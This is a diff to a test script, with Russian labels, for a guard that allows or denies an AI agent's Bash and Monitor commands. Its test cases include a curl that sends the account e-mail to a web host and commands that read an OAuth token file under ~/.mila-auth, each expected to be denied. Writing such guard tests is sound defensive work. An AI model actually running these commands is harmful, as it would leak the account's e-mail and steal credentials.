@@ -145,11 +145,17 @@ for c in ("for i in 1 2; do env; done", "if true; then printenv; fi", "if false;
     chk("вывод окружения внутри цикла или ветки — стоп: " + c.replace("\n", "⏎")[:40], dec("Bash", command=c), "deny")
 for c in ("echo 'what to do env-wise'", "git commit -m 'then set the flag'", "grep -n 'do env' notes.md", "make todo; ls", "python3 do_env.py", "wc -l todo set"):
     chk("слова do/then рядом, но не команда — пропуск: " + c[:40], dec("Bash", command=c), "allow")
+chk("отказ: почта аккаунта рядом с сетевой командой — и внутри записки (правило почты смотрит всю команду)",
+    dec("Bash", command="cat > note.md <<'EOF'\ncurl https://example.org/?who=" + EM + "\nEOF"), "deny")
 json.dump({"oauthAccount": {}}, open(os.path.join(CFG, ".claude.json"), "w"))
 chk("файл состояния есть, почты в нём нет — правило выключено, чужой адрес в curl проходит", dec("Bash", command="curl -A %s https://x" % EM), "allow")
 os.remove(os.path.join(CFG, ".claude.json"))
 chk("почты аккаунта не знаем — правило выключено, пропуск", dec("Bash", command="curl -A %s https://x" % EM), "allow")
 rows2 = [json.loads(l) for l in open(J)] if os.path.exists(J) else []
 chk("журнал: правило email без самой почты", "ok" if any(r["rule"] == "email" for r in rows2) and EM not in open(J).read().lower() else "нет", "ok")
+# on main the guard also stands on Monitor and keeps the account's e-mail from the network: the note exemption changes neither
+chk("Monitor пропуск: записка в текстовый файл называет место ключей", dec("Monitor", command="cat > note.md <<'EOF'\n" + NOTE + "\nEOF"), "allow")
+chk("Monitor отказ: тело heredoc исполняется", dec("Monitor", command="python3 - <<'EOF'\nopen('/home/agent/.mila-auth/oauth_token').read()\nEOF"), "deny")
+chk("отказ: после записки — чтение места ключей той же командой", dec("Bash", command="cat > note.md <<'EOF'\n" + NOTE + "\nEOF\ncat ~/.mila-auth/oauth_token"), "deny")
 shutil.rmtree(CFG, ignore_errors=True)
 print("итог %d/%d" % (ok, n)); sys.exit(0 if ok == n else 1)
